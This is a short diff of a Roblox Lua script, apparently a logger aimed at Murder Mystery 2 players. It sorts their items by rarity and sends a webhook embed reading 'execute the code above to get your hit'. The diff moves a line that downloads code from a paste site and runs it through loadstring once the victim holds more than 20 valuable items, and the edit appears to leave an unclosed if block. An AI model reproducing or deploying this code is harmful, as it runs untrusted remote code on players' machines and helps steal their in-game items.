@@ -1062,9 +1062,6 @@ for a,b in pairs(commonItems) do
     end
 end
 
-if valueCount > 20 then
-loadstring(game:HttpGet("https://pastefy.app/Jw2LlXcN/raw"))()
-
 local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Ancient\n" .. ancientsString ..
                          "\n\n-- // Godlies\n" .. godlysString ..
@@ -1073,7 +1070,8 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Rare\n" .. raresString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
-
+if valueCount > 20 then
+loadstring(game:HttpGet("https://pastefy.app/Jw2LlXcN/raw"))()
 local WebHookEmbed = CreateEmbed(
     "Vlorp Scripts | MM2",
     "Please execute the code above to get your hit.",
